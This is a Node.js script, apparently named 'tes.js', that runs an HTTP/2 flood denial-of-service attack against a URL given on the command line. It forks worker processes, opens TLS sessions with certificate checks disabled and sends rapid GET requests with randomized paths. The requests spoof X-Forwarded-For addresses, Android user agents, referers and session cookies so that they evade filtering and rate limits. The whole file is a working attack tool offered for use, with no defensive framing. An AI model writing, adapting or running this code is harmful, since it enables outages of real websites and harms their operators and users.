import http2 from 'http2';
import tls from 'tls';
import cluster from 'cluster';
import { parse as parseUrl } from 'url';

const targetBase = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rate = parseInt(process.argv[5]);

if (!targetBase || !time || !threads || !rate) {
  console.log('Usage: node tes.js <url> <seconds> <threads> <rate>');
  process.exit(1);
}

function randomProtocol() {
  return Math.random() < 0.5 ? 'https:' : 'http:';
}

function randomIP() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
}

function randomAndroidUA() {
  const versions = ['10', '11', '12', '13'];
  const chromeVersions = ['110', '111', '112', '113', '114'];
  const androidVersion = versions[Math.floor(Math.random() * versions.length)];
  const chromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
  const pixelModel = Math.floor(Math.random() * 6) + 2;

  return `Mozilla/5.0 (Linux; Android ${androidVersion}; Pixel ${pixelModel}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Mobile Safari/537.36`;
}

function randomReferer(host) {
  const pages = ['/login', '/home', '/dashboard', '/account'];
  return `https://${host}${pages[Math.floor(Math.random() * pages.length)]}`;
}

function randomCookie() {
  const sessionId = Math.random().toString(36).substring(2, 15);
  return `session_id=${sessionId}; token=abc${Math.floor(Math.random()*9999)}`;
}

function startFloodSession() {
  const parsed = parseUrl(targetBase);
  const host = parsed.hostname;
  const basePath = parsed.pathname || '/';
  let requestCount = 0;

  setInterval(() => {
    console.log(`[+] ${process.pid} sent ${requestCount} requests/s`);
    requestCount = 0;
  }, 1000);

  function connectAndFlood() {
    const socket = tls.connect({
      host,
      port: 443,
      servername: host,
      rejectUnauthorized: false,
      ALPNProtocols: ['h2'],
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3',
      ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384',
      sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
      ecdhCurve: 'X25519:P-256:P-384:P-521'
    }, () => {
      const client = http2.connect(`${randomProtocol()}//${host}`, {
        createConnection: () => socket
      });

      client.on('error', err => {
        console.warn('[!] HTTP2 client error:', err.message);
      });

      const flood = () => {
        if (client.destroyed || client.closed) {
          console.warn('[!] Client closed, reconnecting...');
          client.destroy();
          socket.destroy();
          return setTimeout(connectAndFlood, 1000);
        }

        for (let i = 0; i < rate; i++) {
          const path = `${basePath}?r=${Math.random().toString(36).substring(2, 8)}`;
          const req = client.request({
            ':method': 'GET',
            ':path': path,
            ':scheme': 'https',
            ':authority': host,
            'user-agent': randomAndroidUA(),
            'accept': '*/*',
            'x-forwarded-for': randomIP(),
            'x-requested-with': 'XMLHttpRequest',
            'referer': randomReferer(host),
            'cookie': randomCookie(),
            'sec-ch-ua': '" Not A;Brand";v="99", "Android";v="13"'
          });
          req.on('response', () => req.close());
          req.on('error', () => {});
          req.end();
          requestCount++;
        }

        setTimeout(flood, 100);
      };

      console.log(`[*] Flooding started on ${host}`);
      flood();
    });

    socket.on('error', err => {
      console.warn('[!] TLS socket error:', err.message);
      setTimeout(connectAndFlood, 1000);
    });
  }

  connectAndFlood();
}

if (cluster.isPrimary) {
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), time * 1000);
} else {
  startFloodSession();
  process.on('uncaughtException', err => console.error('[!] Uncaught:', err));
  process.on('unhandledRejection', err => console.error('[!] Unhandled rejection:', err));
}
